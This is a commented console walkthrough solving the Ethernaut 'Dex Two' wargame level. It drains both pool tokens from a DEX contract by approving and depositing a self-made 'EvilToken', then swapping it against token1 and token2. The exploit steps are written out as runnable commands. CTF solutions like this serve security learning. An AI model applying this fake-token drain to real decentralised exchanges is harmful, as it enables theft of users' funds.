/*
    So, this level is same like before but with a little change in the Swap function which you can easily notice..

    The whole idea is to create an 'EvilToken' which will be owned by us, and kind of really be used to manipulate and drain the tokens
    Refer this -> "https://dev.to/nvn/ethernaut-hacks-level-23-dex-two-4424"

    Here, are the steps:
*/

// First, we need to approve our contract.address to spend the tokens
// Don't know why it didn't work with this -> `await contract.approve(contract.address, 500)`
// Btw try that first, if it works you don't need to follow the below steps and jump directly to the step pointing this '->'

/*
    1. Open remix and create contract - Copy code of Token.sol
    2. Go to deploy section and paste the token1 address in `At Address` section, repeat this with token2
    3. Then run the approve function with (target contract address, 500) as parameters, repeat this with token2
    4. Call the allowance function with (your wallet address, target contract address) as paramters, repeat this with token2

    This make your contract get approved
*/

// -> Now create a contract and paste the code of Attack.sol
/*
    1. Then, deploy it and run the approve function with (contract address, 10000000) as parameters
    2. After that, you need to transfer 100 tokens to the contract address.
*/

// Well, we are all set to go, now open the ethernaut console and run these commands

// First, let's initialize our variables

t1 = await contract.token1()
t2 = await contract.token2()
addr = await contract.address()
evl = "EvilToken address"

// You can check the balance of the contract for Evil tokens, they will be 100

// Now let's swap evl tokens for t1 tokens
await contract.swap(evl, t1, 100)

// swapping evl tokens for t2 tokens
await contract.swap(evl, t2, 200)

// we are done!